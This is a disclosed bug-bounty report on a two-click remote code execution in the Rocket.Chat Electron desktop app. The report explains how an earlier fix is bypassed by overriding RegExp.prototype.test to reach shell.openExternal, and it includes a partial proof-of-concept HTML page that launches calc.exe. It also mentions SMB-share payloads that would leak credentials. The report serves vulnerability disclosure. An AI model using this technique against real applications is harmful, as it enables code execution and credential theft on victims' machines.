# [H] Desktop app RCE (#276031 bypass)

## Summary
Severity: High
Program: Rocket.Chat
Weakness: Code Injection
Reporter: ivarsvids
State: resolved
Disclosed: 2020-11-05T07:21:27.861Z
Source: https://hackerone.com/reports/843171

## Details
**Summary:** #276031 fix bypass, two click remote code execution.

**Description:** The security issue is in links preload file https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/preload/links.js file.
By rewriting  `RegExp.prototype.test` method it is possible to prepare proper answers to get to the `shell.openExternal` method. To trigger  events attached by `addEventListener` you can use `dispatchEvent` method.

Note: for demo I pointed to `calc.exe`, it also cloud be pointed, to SMB share (example. `\\server\share\executable.exe`), which can lead to windows credential leak and attacker also can execute arbitrary code on victims machine.

i believe this issue is cross-platform, an can be exploited in Linux, MacOS with minor JavaScript modifications.

## Releases Affected:

  * Rocket.Chat.Electron 2.17.9 

## Steps To Reproduce (from initial installation to vulnerability):

  1. Create web page with following `index.html`
```
<html>
	<head>
	</head>
	<body style="background-color: white;" >
		<h1>Initializing surprise in 3, 2, 1</h1>
		<script>
			setTimeout(() => {
				// create link
				let a = document.createElement('A');
				a.setAttribute('href', 'c:\\windows\\system32\\calc.exe');

				// hooks regexp.test
				RegExp.prototype._test = RegExp.prototype._test || RegExp.prototype.test;
				RegExp.prototype.test = function(...args){
					return this.source === '^([a-z]+:)?\\/\\/' || this._test(...args);
				}
				
				// add missing method
				document.closest = () => a;

				// triger event
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/843171_
